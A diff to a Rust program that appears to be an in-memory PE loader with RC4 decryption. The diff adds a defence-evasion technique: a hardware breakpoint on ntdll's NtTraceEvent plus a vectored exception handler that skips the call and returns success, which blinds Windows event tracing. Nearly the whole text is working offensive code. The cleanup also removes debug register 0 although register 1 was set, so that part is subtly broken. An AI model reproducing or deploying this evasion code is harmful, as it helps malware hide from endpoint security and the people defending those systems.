@@ -5,14 +5,17 @@ use std::{
 };
 
 use windows_sys::Win32::{
-    Foundation::{DUPLICATE_SAME_ACCESS, DuplicateHandle},
+    Foundation::{DUPLICATE_SAME_ACCESS, DuplicateHandle, EXCEPTION_SINGLE_STEP},
     System::{
         Diagnostics::Debug::{
-            CONTEXT, CONTEXT_FULL_AMD64, GetThreadContext, IMAGE_DIRECTORY_ENTRY_BASERELOC,
+            AddVectoredExceptionHandler, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
+            CONTEXT_FULL_AMD64, EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH,
+            EXCEPTION_POINTERS, GetThreadContext, IMAGE_DIRECTORY_ENTRY_BASERELOC,
             IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_NT_HEADERS64, IMAGE_SCN_MEM_EXECUTE,
-            IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER, SetThreadContext,
+            IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER,
+            RemoveVectoredExceptionHandler, SetThreadContext,
         },
-        LibraryLoader::{GetProcAddress, LoadLibraryA},
+        LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
         Memory::{
             MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
             PAGE_EXECUTE_WRITECOPY, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE,
@@ -31,6 +34,7 @@ use windows_sys::Win32::{
 };
 
 static BUFFER: OnceLock<Vec<u8>> = OnceLock::new();
+static mut NT_TRACE_EVENT_ADDR: *mut c_void = null_mut();
 
 macro_rules! IMAGE_FIRST_SECTION {
     ($ntheader:expr) => {{
@@ -76,6 +80,88 @@ impl Rc4 {
             let k = self.state[(self.state[self.i] as usize + self.state[self.j] as usize) % 256];
             *byte ^= k;
         }
+    }
+}
+
+fn set_hwbp(thread_handle: *mut c_void, addr: *mut c_void, reg_index: u32) -> bool {
+    unsafe {
+        let mut context = zeroed::<CONTEXT>();
+        context.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
+
+        if GetThreadContext(thread_handle, &mut context) == 0 {
+            return false;
+        }
+
+        match reg_index {
+            0 => context.Dr0 = addr as u64,
+            1 => context.Dr1 = addr as u64,
+            2 => context.Dr2 = addr as u64,
+            3 => context.Dr3 = addr as u64,
+            _ => return false,
+        }
+
+        let local_enable_bit = 1u64 << (reg_index * 2);
+        context.Dr7 |= local_enable_bit; // Enable the breakpoint
+        context.Dr7 &= !(0x3 << (16 + reg_index * 4)); // Clear the RW bits
+        context.Dr7 &= !(0x3 << (18 + reg_index * 4)); // Clear the LEN bits
+
+        if SetThreadContext(thread_handle, &mut context) == 0 {
+            return false;
+        }
+    }
+
+    true
+}
+
+fn rm_hwbp(thread_handle: *mut c_void, reg_index: u32) -> bool {
+    unsafe {
+        let mut context = zeroed::<CONTEXT>();
+        context.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
+
+        if GetThreadContext(thread_handle, &mut context) == 0 {
+            return false;
+        }
+
+        match reg_index {
+            0 => context.Dr0 = 0,
+            1 => context.Dr1 = 0,
+            2 => context.Dr2 = 0,
+            3 => context.Dr3 = 0,
+            _ => return false,
+        }
+
+        context.Dr7 &= !(1 << (reg_index * 2)); // Disable the breakpoint
+
+        if SetThreadContext(thread_handle, &mut context) == 0 {
+            return false;
+        }
+    }
+
+    true
+}
+
+unsafe extern "system" fn exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
+    unsafe {
+        if (*(*exception_info).ExceptionRecord).ExceptionCode == EXCEPTION_SINGLE_STEP {
+            if (*(*exception_info).ExceptionRecord).ExceptionAddress == NT_TRACE_EVENT_ADDR {
+                // println!(
+                //     "[+] VEH Triggered: NtTraceEvent: {:?}",
+                //     (*(*exception_info).ExceptionRecord).ExceptionAddress
+                // );
+
+                (*(*exception_info).ContextRecord).Rax = 0;
+                (*(*exception_info).ContextRecord).Rip =
+                    *((*(*exception_info).ContextRecord).Rsp as *const u64);
+                (*(*exception_info).ContextRecord).Rsp += size_of::<*mut c_void>() as u64;
+
+                (*(*exception_info).ContextRecord).EFlags |= 0x10000;
+
+                return EXCEPTION_CONTINUE_EXECUTION;
+            }
+
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+        return EXCEPTION_CONTINUE_SEARCH;
     }
 }
 
@@ -341,6 +427,29 @@ fn main() {
     BUFFER.set(buffer).expect("Failed to set buffer");
 
     unsafe {
+        let h_ntdll = GetModuleHandleA("ntdll.dll\0".as_ptr() as *const u8);
+
+        if h_ntdll.is_null() {
+            println!("[-] Failed to get handle to ntdll.dll");
+            return;
+        }
+        println!("[+] Found ntdll.dll at: {:?}", h_ntdll);
+
+        let nt_trace_event =
+            GetProcAddress(h_ntdll, "NtTraceEvent\0".as_ptr() as *const u8).unwrap() as *mut c_void;
+
+        if nt_trace_event.is_null() {
+            println!("[-] Failed to get address of NtTraceEvent");
+            return;
+        }
+
+        NT_TRACE_EVENT_ADDR = nt_trace_event;
+        println!("[+] Found NtTraceEvent at: {:?}", nt_trace_event);
+
+        AddVectoredExceptionHandler(0, Some(exception_handler));
+
+        set_hwbp(GetCurrentThread(), nt_trace_event, 1);
+
         let current_thread = GetCurrentThread();
         let mut dup_handle: *mut c_void = null_mut();
 
@@ -366,6 +475,8 @@ fn main() {
         }
 
         WaitForSingleObject(thread_handle, 0xFFFFFFFF);
+
+        rm_hwbp(GetCurrentThread(), 0);
 
         return;
     }
